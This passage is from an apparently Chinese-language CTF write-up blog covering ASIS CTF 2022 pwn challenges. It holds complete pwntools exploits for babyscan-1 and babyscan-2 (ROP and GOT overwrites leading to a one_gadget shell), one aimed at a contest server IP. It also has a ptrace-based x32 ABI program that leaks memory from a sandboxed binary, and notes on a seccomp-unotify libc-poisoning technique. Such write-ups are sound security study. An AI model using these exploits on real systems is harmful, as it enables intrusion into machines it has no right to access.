=&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;data = &#x27;</span>, data[:-<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">0x20</span> <span class="hljs-keyword">else</span> data+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    rl()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initial</span>():</span><br>    sl(<span class="hljs-string">b&#x27;Yogdzewa&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x40000004</span>))<br><br><br>initial()<br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span>)<br>chunk1_addr = get(<span class="hljs-number">5</span>)<br>log.success(<span class="hljs-string">f&#x27;data is: 0x<span class="hljs-subst">&#123;chunk1_addr:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x421</span>]))<br><span class="hljs-built_in">set</span>(<span class="hljs-number">7</span>, flat([chunk1_addr+<span class="hljs-number">0x40</span>, chunk1_addr+<span class="hljs-number">0x40</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        log.success(<span class="hljs-string">f&#x27;idx is: <span class="hljs-subst">&#123;<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">set</span>(<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">set</span>(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#the nextchunk header set</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">1</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br><br>gdb.attach(p)<br><span class="hljs-comment">#this will malloc a chunk first, so that puts a chunk between</span><br><span class="hljs-comment">#top chunk and freed one. Will not get into **consolidate forward**</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br>fd_ptr = get(<span class="hljs-number">6</span>)<br>log.success(<span class="hljs-string">f&#x27;fd_ptr is: 0x<span class="hljs-subst">&#123;fd_ptr:x&#125;</span>&#x27;</span>)<br>libc.address = fd_ptr - <span class="hljs-number">0x1ebbe0</span><br>log.success(<span class="hljs-string">f&#x27;libc_base is: 0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># work-in-progress</span><br><br><br><br><br><br>itt()<br></code></pre></div></td></tr></table></figure>

<h1 id="ASIS-CTF-2022"><a href="#ASIS-CTF-2022" class="headerlink" title="ASIS CTF 2022"></a>ASIS CTF 2022</h1><h2 id="babyscan-1"><a href="#babyscan-1" class="headerlink" title="babyscan-1"></a>babyscan-1</h2><p>非预期解, 因为<code>%0s</code>相当于不限制长度. 而且amlloc不改变rsp, 就是直接对栈进行覆盖. 来自r3kapig. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>r = remote(<span class="hljs-string">&#x27;65.21.255.31&#x27;</span>,<span class="hljs-number">13370</span>)<br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br><br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>pop_rdi = <span class="hljs-number">0x0000000000401433</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&quot;alarm&quot;</span>])+p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])+p64(<span class="hljs-number">0x401130</span>) <span class="hljs-comment"># _start</span><br>r.sendline(payload)<br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))-libc.sym[<span class="hljs-string">&quot;alarm&quot;</span>]<br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>ogg = libc_base+<span class="hljs-number">0xe3b01</span>	<span class="hljs-comment"># getted by one_gadget</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(ogg))<br><br><br>r.interactive()<br></code></pre></div></td></tr></table></figure>



<h2 id="babyscan-2"><a href="#babyscan-2" class="headerlink" title="babyscan-2"></a>babyscan-2</h2><p>src: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> size[<span class="hljs-number">16</span>], fmt[<span class="hljs-number">8</span>], *buf;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%15s&quot;</span>, size);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(*size))<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Invalid number&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  buf = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(atoi(size) + <span class="hljs-number">1</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>  <span class="hljs-built_in">snprintf</span>(fmt, <span class="hljs-keyword">sizeof</span>(fmt), <span class="hljs-string">&quot;%%%ss&quot;</span>, size); <span class="hljs-comment">//vuln is here</span><br>  <span class="hljs-built_in">scanf</span>(fmt, buf);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>__attribute__((constructor))<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>  alarm(<span class="hljs-number">180</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>exp: 来自r3kapig-Lotus</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;65.21.255.31&#x27;,33710)</span><br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Lotus_write</span>(<span class="hljs-params">addr,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>    r.send(<span class="hljs-string">b&#x27;9$\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(addr)[:<span class="hljs-number">7</span>])<br>    r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40132b&#x27;)</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x401286&#x27;)</span><br><span class="hljs-comment"># Lotus_write(elf.got[&quot;atoi&quot;],p64(elf.plt[&quot;printf&quot;])+p64(0x401140)+p64(0x401256)[:7])</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;exit&quot;</span>],p64(<span class="hljs-number">0x401256</span>)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40128B&#x27;)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;%p&#x27;)</span><br><br><span class="hljs-comment"># print(hex(elf.plt[&quot;atoi&quot;]))</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;atoi&quot;</span>],p64(elf.plt[<span class="hljs-string">&quot;printf&quot;</span>])[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x4012CD&#x27;)</span><br><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;1-%9$p+&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">b&#x27;+&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x9A154</span><br>r.recvuntil(<span class="hljs-string">b&quot;data: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>ogg = libc_base+<span class="hljs-number">0xe3b01</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;printf&quot;</span>],p64(ogg)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;15&#x27;)</span><br><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>r.interactive()<br></code></pre></div></td></tr></table></figure>



<h2 id="readable"><a href="#readable" class="headerlink" title="readable"></a>readable</h2><p>终于发现了这题目环境的用法, 先是build.sh编译一下然后再docker build, 然后deploy.py中有一句socat命令是在本地开一个端口接收exp文件, 保存为tempfile, 然后映射到docker中的<code>/tmp/exploit</code>, 继续启动docker, 完成权限设置之后执行/home/pwn/run. run设置了seccomp之后execve了exploit, 然后再怎么执行readme就是我们的事了. </p>
<h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution 1"></a>solution 1</h3><p>X32 ABI直接ptrace拿mmap的pie基址劫持write直接leak, 直接利用mmap系统调用时的地址信息打印出前0x2000的东西, 这样直接就可以发现flag. </p>
<p>这个编译起来不得使用32位? 试下. 还是得64位. </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-comment">// X32 ABI 对指针要求 32 位</span><br>    regs = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x233000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">pid_t</span> traced_process;<br>    <span class="hljs-keyword">long</span> ins;<br>    <span class="hljs-keyword">char</span> *argvs[] = &#123;<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execve(<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>, argvs, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exec failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">int</span> blocked = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Wait until the child makes a syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">// ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_GETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        <span class="hljs-comment">// 获取程序基址，用 strace 在本地观察得到特征</span><br>        <span class="hljs-keyword">if</span>(regs-&gt;orig_rax == <span class="hljs-number">10</span> &amp;&amp; regs-&gt;rsi==<span class="hljs-number">0x1000</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mmap Rdi:%08llx\nMmap Rsi:%08llx\nMmap Rdx:%08llx\n&quot;</span>,regs-&gt;rdi,regs-&gt;rsi,regs-&gt;rdx);<br>            base = regs-&gt;rdi;<br>        &#125;<br>        <span class="hljs-comment">// 随便劫持一个 Write 的系统调用，rsi 劫持到基址，rdx 大小大一点</span><br>        <span class="hljs-keyword">if</span> (regs-&gt;orig_rax == <span class="hljs-number">1</span> &amp;&amp; regs-&gt;rdx == <span class="hljs-number">0x10</span>) &#123;<br>            blocked = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi before:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            regs-&gt;rdx = <span class="hljs-number">0x2000</span>;<br>            regs-&gt;rsi = base;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi after:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            <span class="hljs-comment">// ptrace(PTRACE_SETREGS, pid, 0, regs);</span><br>            syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        &#125;<br>        <span class="hljs-comment">// Continue on with the now blocked syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// If the program checks return value of the write, we need to make sure that the return value isn&#x27;t `-ENOSYS`</span><br>        <span class="hljs-comment">// if (blocked) &#123;regs-&gt;rax = 1; ptrace(PTRACE_SETREGS, pid, 0, regs); &#125;</span><br>        <span class="hljs-keyword">if</span> (blocked) &#123;regs-&gt;rax = <span class="hljs-number">1</span>; syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs); <span class="hljs-keyword">break</span>;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>真正的系统调用号保存在 /usr/include/x86_64-linux-gnu/asm/unistd_x32.h：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br>...<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ioctl (__X32_SYSCALL_BIT + 514)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_readv (__X32_SYSCALL_BIT + 515)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_writev (__X32_SYSCALL_BIT + 516)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvfrom (__X32_SYSCALL_BIT + 517)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_sendmsg (__X32_SYSCALL_BIT + 518)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvmsg (__X32_SYSCALL_BIT + 519)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_execve (__X32_SYSCALL_BIT + 520)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ptrace (__X32_SYSCALL_BIT + 521)</span><br>...<br></code></pre></div></td></tr></table></figure>

<ul>
<li><p>而<code>__X32_SYSCALL_BIT</code>的值为<code>0x40000000</code>, 所以上面的数值上就可以解释了. </p>
</li>
<li><p>int 0x80 和 syscall 的<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/46087730#answer-46087731">区别</a> (好吧跟这个没啥关系. </p>
</li>
<li><p>主要利用点在于x64下有一种x32 ABI模式, 能够在减小指针和地址空间开销的同时利用起64位cpu上多的寄存器和运算部件, 提高程序运行速度. 他的系统调用就如上面所示, 只要加上一个数值即可, 或者说是按位或(|). 而寄存器高32位的部分都被清空, 以此模拟32位运行状态. </p>
</li>
</ul>
<p>还没有run过, 第二天环境弄一个小时没整好, 看来还是得靠docker. 终于知道了这一堆东西怎么用了. </p>
<p>不过为什么没法直接跑通? 看着挺好的呀, 但是看起来ptrace全都失败了, regs里面没有一点信息. </p>
<p>我还不知道在docker里面运行的程序如何调试. </p>
<p>ptrace真的fail了, 返回了一个-1. 继续查查errno看是什么. 是not implement. 不知道了. 只能一问队友. </p>
<p>crazyman说ubuntu18能行, 但是docker里面改成18.04并不可行. emmmmm?难道不是这样么?</p>
<p>22/11/14<strong>在编译linux时发现有一个选项是x32 ABI for 64 bit mode</strong>, 勾上了重新编译, 尝试了下能不能运行. </p>
<p>修改HOME路径, 再把readme重新编译成静态文件, 放到HOME中设置成其他用户只读, 忽略run.c(因为他只是限制了一下可用的系统调用)</p>
<p>还是遇到了很多问题. </p>
<ul>
<li>使用busybox的linux还是有很多限制, 每个文件都得编译成静态文件, 使得本来是PIE的readme变成静态链接文件, 然后mmap调用似乎消失了, ptrace根本截取不到(???), 也没有strace看到底发生了什么. </li>
<li>而且静态链接也使得文件变得很大, 仅输出前面0x2000字节还是不够, 还得调整. </li>
</ul>
<p>不过好在发现了这个方法<strong>确实可行</strong>, 不过docker里面的系统似乎都没有加上这一个选项, 想来当时比赛时的环境可以吧. 不过明明都是同一个Dockerfile怎么还不一样呢. </p>
<h3 id="solution-2-intended-one"><a href="#solution-2-intended-one" class="headerlink" title="solution 2 - intended one"></a>solution 2 - intended one</h3><blockquote>
<p>given by the author</p>
</blockquote>
<h4 id="作者原话"><a href="#作者原话" class="headerlink" title="作者原话:"></a>作者原话:</h4><ul>
<li>Intended way was using seccomp unotify to change libc binary</li>
<li>Linker loads libc, you set a hook for openat. And then use seccomp_setfd to send a poisoned libc</li>
</ul>
<p>seccomp unotify: user notify, 可以做到在syscall的时候携带信息给supervisor(大多都是container应用), 让它来决定是继续执行syscall还是停止执行并返回特定数值. </p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程:"></a>流程:</h4><ul>
<li>solve.py上传了exploit, 然后exploit在docker里接受payload放到<code>/tmp/payload</code>. </li>
<li>exp使用UNIX domain socket建立程序间通信渠道. </li>
<li>装载sigchild signal的处理函数, 即退出程序. </li>
<li>fork出子进程, 一通prctl+install seccomp unotifier之后通过socket发送notifyfd, 再执行<code>/home/pwn/readme</code>.<br>其中install的规则主要是为openat装载unotify. </li>
<li>(然后都是unotify supervisor的基本流程)</li>
<li>通过socket接受unotify fd. (这个流程也很长, 使用了recvmsg等一系列奇怪函数, 不管了.)</li>
<li>通过ioctl来轮询fd, 当readme openat的时候会被打断, 此时由父进程打开payload文件, 然后通过seccomp_notif_addfd来复制fd到子进程的fd列表之中, 由ioctl返回在子进程中最终打开的fd number, 最后response, 设置openat syscall的返回值为该fd number. </li>
<li>上面的流程是一个死循环, 由child exit到signal handler终止所有进程.  </li>
</ul>
<h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点:"></a>关键点:</h4><ul>
<li>UNIX domain socket or IPC socket</li>
</ul>
